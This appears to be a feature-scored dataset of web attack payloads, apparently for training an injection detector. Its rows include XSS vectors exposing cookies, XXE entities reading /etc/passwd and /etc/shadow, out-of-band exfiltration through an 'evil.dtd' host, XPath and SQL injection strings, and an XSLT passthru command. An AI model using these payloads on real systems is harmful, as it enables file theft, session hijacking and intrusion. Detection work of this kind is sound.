attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	output
<image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>")'>	L	L	M	L	M	M	L	H	
<image filter='...'>	M	L	L	L	M	L	L	L	
</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="130"><math href="javascript:alert(130)">clickme</math>	L	L	M	L	M	M	L	M	
<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">clickme</maction>	L	L	M	L	M	L	L	M	
<maction actiontype="statusline" xlink:href="javascript:alert(3)">clickme<mtext>http://http://google.com</mtext></maction>	L	L	M	L	M	L	L	H	
</math>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="131"><b>drag and drop one of the following strings to the drop box:</b>	H	M	M	L	L	L	M	M	
<br/><hr/>	M	L	L	L	L	L	L	L	
javascript:alert('top page location: '+document.location+' host page cookies: '+document.cookie);//	M	L	M	L	M	L	M	M	
<br/><hr/>	M	L	L	L	L	L	L	L	
feed:javascript:alert('top page location: '+document.location+' host page cookies: '+document.cookie);//	M	L	M	L	M	M	M	M	
<br/><hr/>	M	L	L	L	L	L	L	L	
feed:data:text/html,&#x3c;script>alert('top page location: '+document.location+' host page cookies: '+document.cookie)&#x3c;/script>&#x3c;b>	H	L	M	L	H	M	M	H	
<br/><hr/>	M	L	L	L	L	L	L	L	
feed:feed:javascript:javascript:feed:alert('top page location: '+document.location+' host page cookies: '+document.cookie);//	M	L	M	L	M	M	M	H	
<br/><hr/>	M	L	L	L	L	L	L	L	
<div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventdefault()">+ drop box +</div>//["'`-->]]>]</div>	L	L	M	L	H	L	M	H	
<div id="132"><!doctype html>	M	L	M	L	L	L	L	M	
<label>type a,b,c,d - watch the network tab/traffic (js is off, latest noscript)</label>	M	L	M	L	M	M	M	M	
<input name="secret" type="password">	H	L	L	L	L	L	L	M	
<!-- injection --><svg height="50px">	M	L	L	L	M	L	M	M	
<image xmlns:xlink="http://www.w3.org/1999/xlink">	M	L	M	L	M	L	L	M	
<set attributename="xlink:href" begin="accesskey(a)" to="//example.com/?a" />	L	L	M	L	M	L	M	M	
<set attributename="xlink:href" begin="accesskey(b)" to="//example.com/?b" />	L	L	M	L	M	L	M	M	
<set attributename="xlink:href" begin="accesskey(c)" to="//example.com/?c" />	L	L	L	L	M	M	M	M	
<set attributename="xlink:href" begin="accesskey(d)" to="//example.com/?d" />	L	L	L	L	M	M	M	M	
</svg>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="133"><!-- `<img/src=xx:xx onerror=alert(133)//--!>//["'`-->]]>]</div>	L	L	M	L	H	M	M	M	
<div id="134"><xmp>	M	L	L	L	L	L	L	L	
<img alt='%></xmp><img src=xx:x onerror=alert(134)//'>	L	L	M	L	M	L	M	M	
x='<%'	M	L	L	L	L	L	L	L	
</script> %>/	M	L	L	L	L	L	L	L	
*{color:red}</style>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>	L	L	M	L	M	L	M	M	
<stylesheet xmlns="http://www.w3.org/tr/wd-xsl">	M	L	L	L	M	L	L	M	
<template match="/">	M	L	L	L	L	L	L	L	
<eval>new activexobject(&apos;htmlfile&apos;).parentwindow.alert(135)</eval>	M	L	M	L	M	L	L	M	
<if expr="new activexobject('htmlfile').parentwindow.alert(2)"></if>	H	L	M	L	M	L	L	M	
</stylesheet>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="136"><form action="" method="post">	L	L	M	L	L	L	M	M	
<input name="username" value="admin" />	H	L	L	L	L	L	M	M	
<input name="password" type="password" value="secret" />	L	L	M	L	L	L	M	M	
<input name="injected" value="injected" dirname="password" />	L	L	M	L	L	L	M	M	
<input type="submit">	M	L	L	L	L	L	L	M	
</form>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="137"><svg>	M	L	L	L	L	L	L	L	
<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">	H	L	M	L	M	L	L	M	
<circle r="400"></circle>	M	L	L	L	L	L	L	M	
<animate attributename="xlink:href" begin="0" from="javascript:alert(137)" to="&" />	L	L	M	L	M	M	M	M	
</a>//["'`-->]]>]</div>	H	L	L	L	M	L	L	M	
<div id="138"><link rel="import" href="test.svg" />//["'`-->]]>]</div><div id="139"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />//["'`-->]]>]</div>undefined	L	L	M	L	H	M	M	H	
<!entity % xxe system "php://filter/convert.base64-encode/resource=/etc/passwd" >	M	L	L	L	M	L	M	M	
<?xml version="1.0" encoding="iso-8859-1"?>	H	L	L	L	M	M	L	M	
<!doctype xxe [<!entity foo "aaaaaa">]>	M	L	L	L	M	L	M	M	
<!doctype xxe [<!entity foo "aaaaaa">]><root>&foo;</root>	H	L	L	L	M	L	M	M	
<?xml version="1.0" encoding="iso-8859-1"?><!doctype xxe [<!entity foo "aaaaaa">]>	L	L	L	L	M	M	M	M	
<?xml version="1.0" encoding="iso-8859-1"?><!doctype xxe [<!entity foo "aaaaaa">]><root>&foo;</root>	L	L	L	L	M	M	M	M	
<?xml version="1.0" encoding="iso-8859-1"?><test></test>	L	L	L	L	M	M	L	M	
<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/passwd" >]><foo>&xxe;</foo>	L	L	L	L	M	M	M	H	
<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/passwd" >]>	L	L	L	L	M	M	M	H	
<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/issue" >]><foo>&xxe;</foo>	L	L	L	L	M	M	M	H	
<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/issue" >]>	L	L	L	L	M	M	M	H	
<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/shadow" >]><foo>&xxe;</foo>	L	L	L	L	M	M	M	H	
<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///etc/shadow" >]>	L	L	L	L	M	M	M	H	
<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///c:/boot.ini" >]><foo>&xxe;</foo>	L	L	L	L	M	M	M	H	
<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "file:///c:/boot.ini" >]>	L	L	L	L	M	M	M	H	
<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "http://example.com:80" >]><foo>&xxe;</foo>	L	L	L	L	M	M	M	H	
<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any ><!entity xxe system "http://example:443" >]>	L	L	L	L	M	M	M	H	
<?xml version="1.0" encoding="iso-8859-1"?><!doctype foo [<!element foo any><!entity xxe system "file:////dev/random">]><foo>&xxe;</foo>	L	L	L	L	M	M	M	H	
<test></test>	M	L	L	L	L	L	L	L	
<![cdata[<test></test>]]>	M	L	L	L	M	L	L	M	
x' or name()='username' or 'x'='y	H	M	L	L	M	L	M	M	
<name>','')); phpinfo(); exit;/*</name>	M	L	L	L	M	L	L	M	
<![cdata[<script>var n=0;while(true){n++;}</script>]]>	M	L	L	L	M	L	L	M	
<![cdata[<]]>script<![cdata[>]]>alert('xss');<![cdata[<]]>/script<![cdata[>]]>	L	L	L	L	H	L	L	M	
<?xml version="1.0" encoding="iso-8859-1"?><foo><![cdata[<]]>script<![cdata[>]]>alert('xss');<![cdata[<]]>/script<![cdata[>]]></foo>	L	L	L	L	H	M	L	H	
<foo><![cdata[<]]>script<![cdata[>]]>alert('xss');<![cdata[<]]>/script<![cdata[>]]></foo>	L	L	L	L	H	L	L	M	
<?xml version="1.0" encoding="iso-8859-1"?><foo><![cdata[' or 1=1 or ''=']]></foo>	L	M	L	L	M	M	M	M	
<foo><![cdata[' or 1=1 or ''=']]></foo>	L	M	L	L	M	M	M	M	
<xml id=i><x><c><![cdata[<img src="javas]]><![cdata[cript:alert('xss');">]]>	L	L	M	L	M	L	L	M	
<xml id="xss"><i><b>&lt;img src="javas<!-- -->cript:alert('xss')"&gt;</b></i></xml><span datasrc="#xss" datafld="b" dataformatas="html"></span></c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>	L	L	M	L	M	M	M	L	
<xml src="xsstest.xml" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>	L	L	M	L	M	L	M	M	
<span datasrc=#i datafld=c dataformatas=html></span>	H	L	M	L	L	L	M	M	
<xml src="xsstest.xml" id=i></xml>	H	L	L	L	L	L	L	M	
<html xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>xss</xss:xss></html>	L	L	M	L	M	L	M	M	
<html xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">	H	L	L	L	M	L	M	M	
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><script>alert(123)</script></xsl:template></xsl:stylesheet>	L	L	M	L	H	M	M	H	
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>	L	L	M	L	H	M	M	L	
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/xsl/transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function('passthru','ls -la')"/></xsl:template></xsl:stylesheet>	L	L	M	L	H	M	M	L	
<!doctype foo [<!element foo any ><!entity xxe system "file:///etc/passwd" >]>	H	L	L	L	M	L	M	M	
<!doctype foo [<!element foo any ><!entity xxe system "file:///etc/shadow" >]>	H	L	L	L	M	L	M	M	
<!doctype foo [<!element foo any ><!entity xxe system "file:///c:/boot.ini" >]>	H	L	L	L	M	M	M	M	
<!doctype foo [<!element foo any ><!entity xxe system "http://example.com/text.txt" >]>	H	L	L	L	M	L	M	M	
<!doctype foo [<!element foo any><!entity xxe system "file:////dev/random">]>	H	L	L	L	M	L	M	M	
<!entity % int "<!entity &#37; trick system 'http://127.0.0.1:80/?%file;'>  "> %int;	L	L	L	L	M	M	M	M	
<!entity % param3 "<!entity &#x25; exfil system 'ftp://127.0.0.1:21/%data3;'>">	L	L	L	L	M	M	M	M	
<!doctype xxe [ <!entity % file system "file:///etc/issue"><!entity % dtd system "http://example.com/evil.dtd">%dtd;%trick;]>	L	L	L	L	M	L	M	H	
<!doctype xxe [ <!entity % file system "file:///c:/boot.ini"><!entity % dtd system "http://example.com/evil.dtd">%dtd;%trick;]>	L	L	L	L	M	L	M	H	
<soap:body><foo><![cdata[<!doctype doc [<!entity % dtd system "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:body>	L	L	M	L	H	L	M	M	
